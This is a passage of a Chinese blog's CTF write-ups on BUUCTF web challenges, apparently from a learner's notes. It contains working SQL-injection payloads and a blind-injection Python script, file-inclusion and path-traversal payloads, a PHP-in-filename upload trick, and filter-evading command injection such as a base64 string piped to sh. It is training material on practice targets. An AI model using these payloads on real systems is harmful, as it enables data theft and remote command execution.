<code>addslashes()</code> 函数后，变成  <code>\\\0</code>（其实php解析后相当于 <code>\\0</code> ） ，然后经过<code>str_replace()</code> 替换之后，id的值就等于反斜杠 \ ，最终id的值嵌入到 sql语句中：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> images <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;\&#x27;</span> <span class="hljs-keyword">or</span> path<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xxx&#x27;</span><br></code></pre></td></tr></table></figure><p>反斜杠 \ 将 id后一个单引号转义成为了一个普通的引号，最终id前面一个单引号与 path 第一个单引号结合在一起了。然后我们可以通过控制 path 变量进行sql注入。</p><p>例如： <code>id=\\0&amp;path= &#39; or 1=1 %23</code>  ，可以成功显示图片，我们只需要改变 1&#x3D;1的值即可注入。</p><p>由于没有回显，我们可以使用 盲注，为了效率，脚本我们使用 二分法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf-8 -*-</span><br><span class="hljs-comment"># @Time : 2023/1/15 11:46</span><br><span class="hljs-comment"># @Author : Leekos</span><br><span class="hljs-comment"># @File : [CISCN2019 总决赛 Day2 Web1]Easyweb.py</span><br><span class="hljs-comment"># @Software : PyCharm</span><br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://b6aeffe5-d882-4699-9232-d735cd759ecd.node4.buuoj.cn:81//image.php?id=\\0&amp;path=&quot;</span><br><span class="hljs-comment"># payload = &quot; or ascii(substr((select database()),&#123;&#125;,1))&gt;&#123;&#125; %23&quot;</span><br><span class="hljs-comment"># database: ciscnfinal</span><br><span class="hljs-comment"># payload = &quot; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125; %23&quot;</span><br><span class="hljs-comment"># table: images,users</span><br>payload = <span class="hljs-string">&quot; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),&#123;&#125;,1))&gt;&#123;&#125; %23&quot;</span><br><br><span class="hljs-comment"># payload = &quot; or ascii(substr((select password from users),&#123;&#125;,1))&gt;&#123;&#125; %23&quot;</span><br><br>result = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">127</span><br>    mid = (low + high) &gt;&gt; <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> high &gt; low:<br>        u = url + payload.<span class="hljs-built_in">format</span>(i, mid)<br>        res = requests.get(url=u)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;JFIF&quot;</span> <span class="hljs-keyword">in</span> res.text:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid<br>        mid = (high + low) &gt;&gt; <span class="hljs-number">1</span><br>        <span class="hljs-comment"># time.sleep(0.1)</span><br>    result += <span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>最终使用脚本查询到 username、password。登录进去，发现是一个文件上传，</p><p>经过尝试，我们可以上传后缀 <code>.phtml</code> 文件</p><img src="https://s2.loli.net/2023/01/15/QZWY5RBeanKJiOS.png" alt="image-20230115153705304" style="zoom:33%;" /><p>我们发现，上传了 <code>phtml</code> 文件后，在 php 文件中回显出来了上传成功的文件日志信息，包括了文件名。</p><p>我们仔细想一下，只要我们将文件名改为php代码，即可实现目录执行，于是：</p><img src="https://s2.loli.net/2023/01/15/WP5jRLiAD7YmdbV.png" alt="image-20230115153920183" style="zoom:50%;" /><p>然后命令执行获得flag</p><h2 id="RootersCTF2019-I"><a href="#RootersCTF2019-I" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p>看题目猜测是 <code>SSTI</code>，但是没给我们传参的参数是什么，</p><p>我们需要使用参数扫描工具：<code>Arjun</code></p><p>扫出get传参：name</p><p>然后可以用<code>tplmap</code>,测出这是jinja2模板注入，然后常规操作</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web(第3页wp)</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web(第1页wp)</title>
    <link href="/2023/08/24/web(%E7%AC%AC1%E9%A1%B5wp)/"/>
    <url>/2023/08/24/web(%E7%AC%AC1%E9%A1%B5wp)/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p><img src="https://s2.loli.net/2022/12/29/FMtGnOo75dyPpE4.png" alt="image-20221229120018704"></p><p>我们登录的时候使用bp抓包，我们尝试从密码进行sql注入</p><p><img src="https://s2.loli.net/2022/12/29/tNmYygWbLwX9qOI.png" alt="image-20221229124310640"></p><p>由于密码是字符串，所以我们尝试使用单引号闭合，然后使用万能密码 <code>or 1=1 #</code> 直接成功了</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27; or 1=1%23//%23是#unicode编码<br></code></pre></td></tr></table></figure><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><img src="https://s2.loli.net/2022/12/29/S4QbTKIFqxdnO5L.png" alt="image-20221229124822502" style="zoom:25%;" /><p>进来后看到一个表情，我们查看源代码:</p><img src="https://s2.loli.net/2022/12/29/8LpoPrCvNWzH3KR.png" alt="image-20221229124906072" style="zoom:33%;" /><p>提示我们去 source.php</p><p>于是,访问source.php:</p><img src="https://s2.loli.net/2022/12/29/XwjFOsV14TYPKWM.png" alt="image-20221229124944279" style="zoom:33%;" /><p>我们先对 file 传参 hint.php:</p><p><img src="https://s2.loli.net/2022/12/29/hYQl3UzTpjgd2xm.png" alt="image-20221229125453134"></p><p>提示 flag 在 : <code>ffffllllaaaagggg</code></p><p>然后我们要分析 checkFile() 这个函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span><span class="hljs-title function_ invoke__"> static function checkFile</span>(&amp;<span class="hljs-variable">$page</span>)<br>        &#123;<br>            <span class="hljs-variable">$whitelist </span>= [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page </span>= <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page </span>. <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page </span>= <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<br>            <span class="hljs-variable">$_page </span>= <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page </span>. <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br></code></pre></td></tr></table></figure><p>大概意思就是说，file参数的值，问号?之前的值一定是 <code>$whitelist</code> 数组中的元素，如果没有问号？函数会帮我们加上，返回问号？之前的值，如果在 <code>$whitelist</code> 数组中，则返回true</p><p>于是我们可以初步构造： <code>?file=hint.php?/../../ffffllllaaaagggg</code> </p><p><img src="https://s2.loli.net/2022/12/29/Q6ELhYqA2iVy8wa.png" alt="image-20221229130637473"></p><p>但是没有任何反应，可能是因为 flag的路径不对，我们可以多往外查看几层，多加几个 <code>../</code></p><p><img src="https://s2.loli.net/2022/12/29/MAU2gCyGxluXIse.png" alt="image-20221229130736728"></p><p>尝试了几次后，就得到了flag(此处我们使用相对路径去包含flag)</p><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p><img src="https://s2.loli.net/2022/12/29/Q9ElKj5OhWTFHep.png" alt="image-20221229130958927"></p><p>查看源代码，只需使用get传参使 cat&#x3D;dog 即可：</p><img src="https://s2.loli.net/2022/12/29/FBngCq1KbAwucNf.png" alt="image-20221229131041275" style="zoom:33%;" /><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p><img src="https://s2.loli.net/2022/12/29/pavdqLHotNgJiwQ.png" alt="image-20221229131143940"></p><p>进入页面，发现有一个 tips 链接，点一下：</p><p><img src="https://s2.loli.net/2022/12/29/mKXPof6y79wjhgO.png" alt="image-20221229131229925"></p><p>发现url中file的参数是 flag.php</p><p>结合题目名称，我们知道这是文件包含漏洞</p><p><img src="https://s2.loli.net/2022/12/29/Ux1e2fEic8SznRC.png" alt="image-20221229131558624"></p><p>我们直接使用 <code>php://filter</code> 伪协议，将flag.php 转为base64编码，然后base64解密即可:</p><img src="https://s2.loli.net/2022/12/29/2romCE9UaNzA6vX.png" alt="image-20221229131712322" style="zoom: 25%;" /><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><img src="https://s2.loli.net/2022/12/29/n1d8iuchPMzAtFf.png" alt="image-20221229131816419" style="zoom:33%;" /><p>打开页面，发现可以使用 ping 命令，于是我们知道，这是命令执行</p><p>我们先用bp抓包：</p><img src="https://s2.loli.net/2022/12/29/6u8DAV39IKNJtcv.png" alt="image-20221229132009045" style="zoom:33%;" /><p>修改target，linux命令执行，我们可以使用 <code>;</code> <code>|</code>  进行分隔：</p><img src="https://s2.loli.net/2022/12/29/YlGzm193Ljb7HQC.png" alt="image-20221229132201759" style="zoom:33%;" /><p>发现flag在根目录下，直接cat查看</p><img src="https://s2.loli.net/2022/12/29/T9oy83us4JQZKSW.png" alt="image-20221229132236387" style="zoom:33%;" /><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>我们先判断闭合情况，先用bp抓包：</p><p><img src="C:/Users/LIKE/AppData/Roaming/Typora/typora-user-images/image-20221229143254310.png" alt="image-20221229143254310"></p><img src="https://s2.loli.net/2022/12/29/x5ur1q2v83EQKSz.png" alt="image-20221229143404537" style="zoom:33%;" /><p>发现可以使用单引号闭合，接着我们判断字段数：</p><img src="https://s2.loli.net/2022/12/29/6zKp1vtrPDNQxfw.png" alt="image-20221229143522323" style="zoom:33%;" /><p>发现表中只有两列</p><p>接着我们想要使用联合查询去判断回显情况：</p><p><img src="https://s2.loli.net/2022/12/29/uZpaVD5HXWejqES.png" alt="image-20221229143638399"></p><p>结果发现select等语句被过滤了，我们发现这样就查询不了数据了。。。</p><p>然后经过尝试，我们发现可以进行 <code>堆叠注入</code>，我们先查数据库：</p><img src="https://s2.loli.net/2022/12/29/GfosNk1dLB5lzmx.png" alt="image-20221229143849236" style="zoom:33%;" /><p>然后，我们查询当前数据库有哪些表：</p><img src="https://s2.loli.net/2022/12/29/1hldTufzy9N3SCb.png" alt="image-20221229143946335" style="zoom:33%;" /><p>然后分别查询两个表的字段，我们先查 <code>words</code> 表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?inject<span class="hljs-operator">=</span><span class="hljs-number">0</span><span class="hljs-string">&#x27;;show columns from words;%23</span><br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/12/29/E2u7SH8PcewhA3z.png" alt="image-20221229144152210" style="zoom:33%;" /><p>然后我们查询  <code>1919810931114514</code> 表的列名</p><img src="https://s2.loli.net/2022/12/29/CXS21BOujiLqKE5.png" alt="image-20221229144303447" style="zoom:33%;" /><p>我们发现，如果直接 <code>0&#39;;show columns from 1919810931114514;%23 </code> 的话，是查询不到数据的。</p><blockquote><p><strong>MySQL反引号</strong>:  <strong>&#96;</strong> 它是为了区分MYSQL的保留字与普通字符而引入的符号。</p><p>有MYSQL保留字作为字段的，必须加上反引号来区分。</p></blockquote><p>我们需要将该表名加上反引号：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">0</span><span class="hljs-string">&#x27;;show columns from `1919810931114514`;%23</span><br></code></pre></td></tr></table></figure><p>查询到该表下有一个 flag 字段。</p><p>禁用了 select 怎么查询数据呢？</p><p><strong>方法一：</strong></p><p>我记得mysql中有一个可以查询数据的语句 : <code>handler</code></p><blockquote><p>mysql除可使用select查询表中的数据，也可使用<strong>handler语句</strong>，这条语句使我们能够<strong>一行一行的浏览一个表中的数据</strong>，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句.</p></blockquote><p>基本语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 打开一个表名为 tbl_name 的表的句柄<br>HANDLER tbl_name OPEN [ [AS] alias]<br><br># 1、通过指定索引查看表，可以指定从索引那一行开始，通过 NEXT 继续浏览<br>HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)<br>    [ WHERE where_condition ] [LIMIT ... ]<br><br># 2、通过索引查看表<br># FIRST: 获取第一行（索引最小的一行）<br># NEXT: 获取下一行<br># PREV: 获取上一行<br># LAST: 获取最后一行（索引最大的一行）<br>HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;<br>    [ WHERE where_condition ] [LIMIT ... ]<br><br># 3、不通过索引查看表<br># READ FIRST: 获取句柄的第一行<br># READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）<br># 最后一行执行之后再执行 READ NEXT 会返回一个空的结果<br>HANDLER tbl_name READ &#123; FIRST | NEXT &#125;<br>    [ WHERE where_condition ] [LIMIT ... ]<br><br># 关闭已打开的句柄<br>HANDLER tbl_name CLOSE<br></code></pre></td></tr></table></figure><p>于是我们可以使用 handler 语句去查看数据：</p><p>先打开，然后查看，接着关闭：</p><p><img src="https://s2.loli.net/2022/12/29/jpN75QRUBlJmZCa.png" alt="image-20221229145901288"></p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#x27;;handler+`1919810931114514`+open;handler+`1919810931114514`+read+first;handler+`1919810931114514`+close;%23<br></code></pre></td></tr></table></figure><p>成功查询到flag。我觉得 handler 挺重要的。</p><p>方法二：</p><p>我们可以使用 <strong>mysql 预处理语句</strong>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- 在sql语句中，@  用于定义变量。<br>- concat()，函数用于字符串拼接。<br>- char()，将ASCII码转换为对应的字符。<br>- 定义预处理语句 PREPARE stmt_name FROM preparable_stmt; <br>- 执行预处理语句 EXECUTE stmt_name [USING @var_name [, @var_name] ...]; <br>- 删除(释放)定义 &#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;<br></code></pre></td></tr></table></figure><p>首先，我们先使用 @ 定义变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @sql=concat(char(115,101,108,101,99,116),&quot;* from `1919810931114514`&quot;);<br></code></pre></td></tr></table></figure><p>然后我们使用 prepare 编译，使用execute执行:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">PREPARE yuchuli from @sql;<br>EXECUTE yuchuli;<br></code></pre></td></tr></table></figure><p>解释:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">- 因为select被过滤，用char(115,101,108,101,99,116)生成select，也可以用拼接生成select。<br>- 然后用concat()拼接成一句完整的sql语句。           <br>- 先定义了一个变量sql，然后将变量sql定义为预处理语句，然后再执行。<br></code></pre></td></tr></table></figure><p>于是：</p><p><img src="https://s2.loli.net/2022/12/29/UOevT4wmKcLna9I.png" alt="image-20221229151445644"></p><p><a href="https://www.cnblogs.com/geaozhang/p/9891338.html">MySQL预处理</a></p><p><strong>方法三：</strong></p><p>可以使用改表明，列名的方法。</p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p><a href="https://blog.csdn.net/mochu7777777/article/details/108937396">https://blog.csdn.net/mochu7777777/article/details/108937396</a></p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p><img src="https://s2.loli.net/2022/12/29/Ya7iSb3HkAyfwg6.png" alt="image-20221229155148065"></p><p>使用bp抓包，易知，这是一道命令执行题.</p><p>我们使用  <code>;</code>  分隔,使用<code>ls</code>查看当前目录下的文件：</p><p><img src="https://s2.loli.net/2022/12/29/xdpUut5Aea7TXiS.png" alt="image-20221229155216289"></p><p>发现flag.php 在当前目录，于是我们使用 <code>cat</code>  查询flag</p><p><img src="https://s2.loli.net/2022/12/29/qOk96TmfiXN1PQx.png" alt="image-20221229155337854"></p><p>发现好像被过滤了。</p><img src="https://s2.loli.net/2022/12/29/aYGdKUVpSmJwZ1j.png" alt="image-20221229155433499" style="zoom:33%;" /><p>去掉 * 发现空格也被过滤了</p><p>我们使用 ${IFS} 代替空格</p><img src="https://s2.loli.net/2022/12/29/LJEjrvzNPGmWide.png" alt="image-20221229155531904" style="zoom:33%;" /><p>发现 <code>&#123;&#125;</code> 被过滤了 ，于是我们使用 <code>$IFS$9</code> 代替</p><img src="https://s2.loli.net/2022/12/29/IaQthpZzY41vLMo.png" alt="image-20221229155707796" style="zoom:33%;" /><p>正常了，但是flag被过滤了。</p><p><strong>解法一：</strong></p><p>我们可以尝试<code>内联执行</code> : 将一次的执行结果当作另一次执行的输入</p><p>payload:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/?ip=;cat$IFS$9`ls`<br></code></pre></td></tr></table></figure><p>反引号<code>括起来的 </code>ls&#96; 先执行，得到 flag.php 和 index.php</p><p>然后，cat后执行，将flag.php和index.php的内容都输出了</p><img src="https://s2.loli.net/2022/12/29/mr3wBczhCHV5lPE.png" alt="image-20221229160134317" style="zoom:33%;" /><p><strong>解法二：</strong></p><p>我们先通过cat查看index.php的源码：</p><p>payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/?ip=;cat$IFS$9index.php<br></code></pre></td></tr></table></figure><p>index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your symbol!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ /&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your space!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/bash/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your bash!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);<br>  &#125;<br>  <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;ping -c 4 &quot;</span>.<span class="hljs-variable">$ip</span>);<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<br>  <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$a</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我们可以使用 <code>字符串拼接绕过</code> ，payload:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/?ip=;b=ag.php;a=fl;cat$IFS$9$b$a;<br></code></pre></td></tr></table></figure><p>变量 a&#x3D;fl  变量 b&#x3D;ag.php  然后cat时我们使用 $b$a 将值给取出来，并拼接成flag.php</p><p><strong>方法三:</strong></p><p>这里过滤了bash，但是我们还可以使用 <code>sh</code> , payload:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">/?ip=;echo$IFS$9Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh;<br>// cat flag.php    base64=&gt;    Y2F0IGZsYWcucGhw<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/29/X4zGQktnHoEYNj5.png" alt="image-20221229161315716"></p><p>payload意思就是，我们先将 base64后的值 <code>Y2F0IGZsYWcucGhw</code> 作为 <code>base64 -d</code> 的输入，这时就被解码成 cat flag.php 了，然后作为 sh 脚本进行命令执行</p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>查看源代码，进入到 <code>/Archive_room.php</code> 中</p><p><img src="https://s2.loli.net/2022/12/29/9Z7bFMQr1BfPtaD.png" alt="image-20221229161735727"></p><p>点击 secret 时使用bp抓包：</p><img src="https://s2.loli.net/2022/12/29/bfBXdncum9I1YLr.png" alt="image-20221229161825235" style="zoom:25%;" /><p><img src="https://s2.loli.net/2022/12/29/GVnMWd4bULJejhO.png" alt="image-20221229161840985"></p><p>发现了 <code>secr3t.php</code> ,我们进入这个页面：</p><p><img src="https://s2.loli.net/2022/12/29/OlifJW6gdzpNEmT.png" alt="image-20221229161929596"></p><p>得到了一串代码，审计一下，发现没有过滤 <code>php://filter</code></p><p>于是可以使用伪协议读取源代码：</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/29/kxCJFRYMdTlAr5L.png" alt="image-20221229162207633"></p><p>base64解码得到flag</p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>我们登录时使用bp抓包：</p><p><img 